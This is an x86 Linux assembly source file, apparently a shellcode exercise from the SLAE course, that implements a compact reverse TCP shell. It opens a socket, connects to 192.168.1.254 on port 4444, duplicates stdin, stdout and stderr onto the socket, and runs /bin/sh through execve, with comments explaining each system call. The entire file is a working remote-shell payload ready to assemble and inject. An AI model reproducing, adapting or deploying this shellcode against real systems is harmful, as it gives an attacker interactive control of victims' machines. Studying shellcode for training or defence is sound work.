;coded by SLAE - 513 - Andriy Brukhovetskyy
;syscall numbers can be found here /usr/include/asm/unistd_32.h
;socketcall man - http://www.tutorialspoint.com/unix_sockets/socket_core_functions.htm
;socket families definitions can be locked here: /usr/src/<tab>/include/linux/socket
;or we can use python socket modude - example socket.AF_INET
;Values needed to configure socket can be found here:
;/usr/include/linux/net.h
;96 bytes lenght

global _start
section .text

_start:
        ;int socket (int family, int type, int protocol);
        xor eax, eax
        mov al, 102     ; socketcall
        
        xor ebx, ebx
        mov bl, 1        ; 1 = SYS_SOCKET socket()
        
        xor ecx, ecx
        push ecx

        push BYTE 6        ; IPPROTO_TCP - int protocol
        push BYTE 1        ; SOCK_STREAM - int type
        push BYTE 2        ; AF_INET     - int domain

        mov ecx, esp       ; ECX - PTR to arguments for socket()
        int 0x80

        mov esi, eax        ; save socket fd in ESI for later
        
        ;int connect(int sockfd, struct sockaddr *serv_addr, int addrlen);
        xor eax, eax
        mov al, 102 ; socketcall
        
        xor ebx, ebx
        mov bl, 3   ; 3 = sys_connect()
        
        xor edx, edx
        push dword 0xfe01a8c0; ip 192.168.1.254
        push word 0x5c11     ; port 4444
        
        dec ebx       ; ebx now is 2
        push word bx  ; 2 - AF_INET
        inc ebx       ; 3
        mov ecx, esp  ; ptr to struct sockaddr
        push byte 16  ; socklen_t addrlen
        push ecx      ; struct sockaddr *addr
        push esi      ; int sockfd
        mov ecx, esp  ; ECX = PTR to arguments for connect()
        int 0x80      ; sockfd will be in EBX
        
        mov eax, ebx ; sockfd
        
        push BYTE 3
        pop ecx
          
        ;forwaring STDIN/STDOUT/STDERR to socket
dup2_loop:
        dec ecx        ; adjusting values 2=STDERR, 1 = STDOUT, 0=STDIN 
        mov BYTE al, 63; dup2 for syscal
        int 0x80
        jnz dup2_loop ; jump if not 0
        
        ; spawning as shell
        xor eax, eax
        mov al, 11        ; execve syscall
        xor edx, edx
        push edx        
        ; '/bin//sh'[::-1] <- reverse mode
        push 0x68732f2f ; hs//
        push 0x6e69622f ; nib/
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp        ; ESP is now pointing to EDX
        push edx
        mov edx, esp
        int 0x80
